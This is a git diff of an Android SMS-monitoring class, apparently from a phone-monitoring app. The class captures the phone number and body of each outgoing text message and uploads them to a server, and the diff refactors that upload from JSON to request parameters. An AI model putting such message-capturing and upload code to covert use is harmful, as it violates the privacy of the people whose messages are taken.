@@ -1,20 +1,17 @@
 package com.inet.android.message;
 
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * SmsSentObserver class is design for monitoring outgoing sms
@@ -53,7 +50,8 @@ public class SmsSentObserver extends ContentObserver {
 		try {
 			Logging.doLog(TAG, "Notification on SMS observer",
 					"Notification on SMS observer");
-			if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, mContext) == 0)
+			if (AppSettings.getState(AppConstants.TYPE_INCOMING_SMS_REQUEST,
+					mContext) == 0)
 				return;
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
@@ -97,30 +95,17 @@ public class SmsSentObserver extends ContentObserver {
 												.getColumnIndex("body"));
 
 								// -------send sms----------------------------
-								String sendJSONStr = null;
-								JSONObject jsonObject = new JSONObject();
-								JSONArray data = new JSONArray();
-								JSONObject info = new JSONObject();
-								JSONObject object = new JSONObject();
-								try {
+								RequestParams params = new RequestParams();
+								params.put("data[][info][number]", phNumber);
+								params.put("data[][info][data]", message);
 
-									info.put("number", phNumber);
-									info.put("data", message);
+								params.put("data[][time]",
+										ConvertDate.logTime());
+								params.put("data[][type]",
+										AppConstants.TYPE_OUTGOING_SMS_REQUEST);
+								params.put("key", System.currentTimeMillis());
 
-									object.put("time", ConvertDate.logTime());
-									object.put(
-											"type",
-											ConstantValue.TYPE_OUTGOING_SMS_REQUEST);
-									object.put("info", info);
-									data.put(object);
-									jsonObject.put("data", data);
-									sendJSONStr = object.toString();
-								} catch (JSONException e) {
-									Logging.doLog(TAG, "json сломался",
-											"json сломался");
-								}
-
-								RequestList.sendDataRequest(sendJSONStr, mContext);
+								RequestList.sendDataRequest(params, mContext);
 
 								/*
 								 * if(colNames != null){ for(int k=0;
